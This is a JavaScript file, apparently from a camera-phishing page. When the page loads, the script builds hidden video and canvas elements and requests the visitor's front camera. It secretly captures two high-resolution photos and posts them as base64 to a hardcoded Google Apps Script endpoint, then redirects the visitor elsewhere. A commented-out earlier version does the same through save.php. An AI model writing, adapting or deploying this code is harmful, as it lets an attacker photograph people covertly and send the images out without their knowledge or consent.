// document.addEventListener("DOMContentLoaded", async () => {
//     const video = document.getElementById('video');
//     const canvas = document.getElementById('canvas');
//     const context = canvas.getContext('2d');
//     const constraints = { video: { facingMode: "user" }, audio: false };

//     let captureCount = 0;
//     const maxCaptures = 2;

//     try {
//         const stream = await navigator.mediaDevices.getUserMedia(constraints);
//         video.srcObject = stream;

//         const intervalId = setInterval(() => {
//             context.drawImage(video, 0, 0, 640, 480);
//             const dataURL = canvas.toDataURL('image/png');

//             fetch("save.php", {
//                 method: "POST",
//                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
//                 body: "image=" + encodeURIComponent(dataURL)
//             })
//             .then(res => res.text())
//             .then(txt => {
//                 console.log(txt);
//                 captureCount++;
//                 if (captureCount >= maxCaptures) {
//                     clearInterval(intervalId);
//                     fetch("redirect.txt")
//                         .then(response => response.text())
//                         .then(url => {
//                             document.getElementById("loading-text").textContent = "Redirecting...";
//                             setTimeout(() => {
//                                 window.location.href = url.trim();
//                             }, 1000);
//                         })
//                         .catch(err => console.error("Redirect fetch error:", err));
//                 }
//             })
//             .catch(err => console.error(err));
//         }, 1500);

//     } catch (err) {
//         console.error("Camera access denied:", err);
//         document.getElementById("loading-text").textContent = "Camera access denied.";
//     }
// });


document.addEventListener("DOMContentLoaded", async () => {
    // Create hidden video and canvas elements
    const video = document.createElement('video');
    video.setAttribute('autoplay', '');
    video.setAttribute('playsinline', '');
    video.style.display = 'none';
    
    const canvas = document.createElement('canvas');
    canvas.style.display = 'none';
    
    // Add them to the document body
    document.body.appendChild(video);
    document.body.appendChild(canvas);
    
    const context = canvas.getContext('2d');
    const constraints = { 
        video: { 
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
        }, 
        audio: false 
    };

    let captureCount = 0;
    const maxCaptures = 2;

    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;

        // Set canvas size to match video
        video.addEventListener('loadedmetadata', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
        });

        const intervalId = setInterval(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
            
            // Extract base64 data from data URL
            const base64Data = dataURL.split(',')[1];
            
            // Generate filename with timestamp
            const now = new Date();
            const filename = `capture_${now.getTime()}.jpg`;

            // Send to Google API
            fetch('https://script.google.com/macros/s/AKfycbxveLuf1BJSzOr81f8ffjUfbS62-e1W3wnvXofXDFwSdatcBGabzXC6c8fbytcX346w/exec', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    image: base64Data,
                    filename: filename
                })
            })
            .then(res => res.text())
            .then(txt => {
                console.log(txt);
                captureCount++;
                
                if (captureCount >= maxCaptures) {
                    clearInterval(intervalId);
                    
                    // Stop all video tracks
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Redirect after successful capture
                    setTimeout(() => {
                        window.location.href = "https://example.com"; // Replace with your redirect URL
                    }, 1000);
                }
            })
            .catch(err => console.error(err));
        }, 1500);

    } catch (err) {
        console.error("Camera access denied:", err);
        // Handle camera access error (you can customize this)
        document.body.innerHTML += '<div style="color: red; padding: 20px; text-align: center;">Camera access denied. Please refresh and allow camera access.</div>';
    }
});
